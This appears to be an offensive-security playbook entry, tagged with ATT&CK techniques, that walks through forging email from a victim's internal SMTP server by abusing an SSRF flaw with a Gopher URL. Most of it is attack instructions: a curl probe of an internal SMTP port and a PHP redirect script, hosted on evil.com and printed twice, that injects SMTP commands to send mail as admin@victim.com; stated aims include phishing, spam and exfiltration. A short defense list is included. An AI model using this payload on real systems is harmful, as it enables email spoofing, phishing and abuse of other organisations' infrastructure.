---
type: procedure
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Resource Development|TA0042 - Resource Development]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/External Remote Services|T1133 - External Remote Services]]'
  - '[[techniques/Obtain Capabilities|T1588 - Obtain Capabilities]]'
sub_techniques: []
tags:
  - '[[tags/Gopher]]'
  - '[[tags/Gopher SMTP - send a mail]]'
  - '[[tags/Server-Side Request Forgery]]'
  - '[[tags/SSRF exploitation via URL Scheme]]'
  - ssrf
  - email-spoofing
  - smtp
commands:
  - '[[commands/generate-gopher-smtp-payload]]'
tools: []
platforms:
  - Web
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Gopher-SMTP-Email-Spoofing-via-SSRF

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in a public-facing application to send spoofed email messages via the Gopher protocol over SMTP port 25. By crafting a PHP redirect script that encodes SMTP commands into a Gopher URL, an attacker can trick the vulnerable server into connecting to its own SMTP service (or an internal one) and relaying an email with a forged sender address, enabling phishing, spam, or data exfiltration from the victim's infrastructure.

## Description

Server-Side Request Forgery (SSRF) allows attackers to force a server to make unintended requests to internal or external resources. In this technique, the Gopher protocol (gopher://) is abused because it supports TCP payloads, enabling the injection of raw SMTP commands to an SMTP server on port 25. The attack begins by identifying an SSRF-vulnerable endpoint that processes user-supplied URLs (e.g., an image fetcher or redirect handler). The attacker hosts a malicious PHP script on a controlled domain that redirects to the Gopher URL containing SMTP commands like HELO, MAIL FROM, RCPT TO, DATA, and the message body terminated by a single dot. When the victim server fetches this URL via SSRF, it executes the Gopher protocol, sending the email as if from the internal server. This is particularly dangerous in environments with internal SMTP relays, as it bypasses external email security controls. The target environment is typically a web application on Linux with SSRF exposure and an accessible SMTP service. Success results in the recipient receiving an email spoofed from the victim's domain, potentially leading to further compromise.

## Requirements

1. Identification of an SSRF vulnerability in a public-facing web application that allows URL redirects or fetches.
2. Access to a controlled web server (e.g., evil.com) to host the PHP redirect script.
3. Knowledge of the victim's SMTP server details (domain for HELO, port 25 accessible internally).
4. PHP runtime on the attacker's hosting server.
5. Target application must support or not block the Gopher protocol in SSRF requests.

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation and whitelisting to block non-HTTP/HTTPS protocols like Gopher; use libraries that disable URL scheme parsing for internal requests.
- Disable or restrict Gopher protocol support in server configurations (e.g., via nginx/Apache rules) and firewall SMTP port 25 access from web servers.
- Monitor application logs for suspicious redirects or Gopher URLs, and SMTP logs for anomalous HELO domains or unexpected internal relays.
- Use web application firewalls (WAFs) to detect payload patterns like %0A-encoded SMTP commands.
- Enable email authentication (SPF, DKIM, DMARC) on the victim's domain to flag spoofed messages.

## Objectives

1. Forge and send emails from the victim's internal SMTP server to arbitrary recipients.
2. Conduct phishing campaigns or spam using the victim's domain for credibility.
3. Exfiltrate sensitive information by embedding data in email bodies or attachments relayed through the SSRF.
4. Establish persistence by sending commands for further actions if SMTP supports extensions.

## Instructions

### Step 1: Identify SSRF Vulnerability and Target SMTP

**Context**: Confirm the SSRF endpoint allows arbitrary URL fetches and that the victim's internal SMTP server on port 25 is reachable via loopback (127.0.0.1 or 0). Test basic SSRF with a benign URL like http://169.254.169.254 (AWS metadata) to validate.

**Command** ([[commands/curl-ssrf-test]]):
```bash
curl -X POST http://victim-app.com/fetch?url=http://internal.smtp:25
```

> This tests if the application processes the URL without blocking. Replace http://victim-app.com/fetch with the actual SSRF endpoint. Expected output: No errors, and if verbose, confirmation of internal request.

### Step 2: Craft SMTP Payload Using PHP Redirect Script

**Context**: Create a PHP script that builds the SMTP command sequence and redirects to the Gopher URL. This script will be hosted on your controlled domain and triggered via the SSRF-vulnerable fetch.

**Code** ([[codes/PHP-Gopher-SMTP-Email-Spoof-Redirect]]):

```php
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

> Save this as redirect.php on your server (e.g., http://evil.com/redirect.php). Customize the $commands array: HELO with victim's domain, MAIL FROM with spoofed sender, RCPT TO with target recipient, DATA followed by Subject and body lines, ending with single '.' for SMTP termination. The %0A joins commands with CRLF equivalents for the protocol. When accessed, it redirects to gopher://0:25/_payload, forcing the victim's server to send the SMTP commands.

### Step 3: Trigger SSRF to Execute the Payload

**Context**: Lure the SSRF endpoint to fetch your redirect URL, which chains to the Gopher SMTP interaction. Monitor the recipient's inbox for the spoofed email.

**Command** ([[commands/generate-gopher-smtp-payload]]):
```php
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

> Execute this PHP script via the SSRF endpoint, e.g., POST the URL http://evil.com/redirect.php to the fetch parameter. If SSRF works, the victim's server will follow the redirect, connect to its SMTP on port 25 (via 0 as host), and relay the email. Decision point: If the app blocks redirects, modify to direct Gopher URL injection if possible.

### Step 4: Verify Success and Iterate

**Context**: Check the recipient email for delivery. If failed, adjust payload (e.g., use 127.0.0.1 instead of 0) or test SMTP directly.

> Expected: Email arrives with spoofed From: admin@victim.com. If no delivery, inspect victim logs for blocked protocols or firewall hits.
